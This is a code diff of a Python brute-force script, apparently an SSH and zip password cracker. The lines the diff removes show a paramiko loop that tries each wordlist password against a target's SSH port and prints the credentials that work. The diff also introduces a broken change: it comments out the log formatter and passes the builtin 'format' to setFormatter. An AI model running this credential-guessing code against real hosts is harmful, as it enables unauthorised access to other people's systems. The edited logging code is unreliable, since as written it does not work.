@@ -15,10 +15,10 @@ import logging
 from logging.handlers import RotatingFileHandler
 
 # Set up logging with rotation
-log_handler = RotatingFileHandler('brute_force.log', maxBytes=5*1024*1024, backupCount=3)  # 5MB per file, 3 backups
+log_handler = RotatingFileHandler('brute_force.log', maxBytes=5*1024*1024, backupCount=3)  
 log_handler.setLevel(logging.DEBUG)
-formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
-log_handler.setFormatter(formatter)
+#formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+log_handler.setFormatter(format)
   
 logger = logging.getLogger(__name__)
 logger.setLevel(logging.DEBUG)
@@ -48,19 +48,6 @@ def iterator():
         logger.info(f"Read word: {word}")  # [MOD] Log each word read
         print(word)
  
-    
-    file = open(filepath, encoding="ISO-8859-1") 
- # Read the first line from the file
-    line = file.readline() 
-    while line:  
-        line = line.rstrip()  
-        word = line  
-        print(word)  
-        time.sleep(1)  
-# Read the next line from the file
-        line = file.readline()  
-# Close the file
-    file.close()  
 
 def check_password():
     usr_password = getpass.getpass(prompt="Please enter a password: ") 
@@ -107,24 +94,6 @@ def brute_force_ssh():
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     
-    while line:
-        line = line.rstrip()
-        password = line
-        
-        try:
-            ssh.connect(ip, port=22, username=username, password=password, timeout=3)
-            print(f"Success! Username: {username} Password: {password}")
-            break
-        except paramiko.AuthenticationException:
-            print(f"Failed: {password}")
-        except Exception as e:
-            print(f"Connection error: {e}")
-            break
-        
-        line = file.readline()
-    
-    file.close()
-    ssh.close()
     
     
  #  Prompt user for path to zip file 
